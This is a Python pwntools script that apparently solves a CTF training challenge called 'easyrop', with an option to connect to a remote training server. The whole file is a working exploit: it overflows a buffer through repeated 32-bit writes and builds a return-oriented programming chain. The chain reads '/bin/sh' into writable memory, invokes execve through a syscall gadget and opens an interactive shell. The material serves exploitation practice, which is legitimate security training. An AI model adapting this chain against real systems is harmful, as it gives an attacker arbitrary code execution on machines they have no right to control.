from pwn import *
import time
import subprocess
import sys

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"


if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 2015)
else:
	r = process("./easyrop")
	gdb.attach(r, """
	# b *0x00400290
	unset env
	c
	""")

# appends the a 32 bit number throught the program in the stack
# their sum will be the 32 bit number and this will be written in the stack
def insert32(addr32):
    r.send(p32(addr32))	#buf[0]
    time.sleep(0.2)
    r.send(p32(0x00))	#integer

# appends in the stack a 64 bit number
def insert64(addr64):
    insert32(addr64 & 0x00000000FFFFFFFF) # I write first the low part
    insert32((addr64 & 0xFFFFFFFF00000000) >> 32) # and then I write the high part

input("wait")
time.sleep(0.5)

# I fill the buffer
# every inser64 is an interation inside the while cycle
for i in range(7):
    insert64(0x0000003100000041)

string_addr = 0x600400 # usually .bss continues to be indexable and writable even if the memory is finished
read = 0x400144
pop_rdi_rsi_rdx_rax = 0x4001c2
syscall = 0x400168


insert64(pop_rdi_rsi_rdx_rax) # start of RIP, prepare for the read
insert64(0x00) # read from stdin
insert64(string_addr) # buffer to write
insert64(0xa) # I'll try to read 10 bytes
insert64(0x3b) # I prepare meanwhile the register RAX for the next execution
insert64(read) # I read the string "/bin/sh\x00", 8 bytes
insert64(pop_rdi_rsi_rdx_rax) # prepare for the execve
insert64(string_addr) # string for the execve
insert64(0x00) # null 
insert64(0x00) # null
insert64(0x3b) # execve code
insert64(syscall) # i do the syscall


r.send(b"\x00")
time.sleep(0.2)
r.send(b"\x00")

r.send(b"/bin/sh\x00")
time.sleep(0.2)
       
r.interactive()
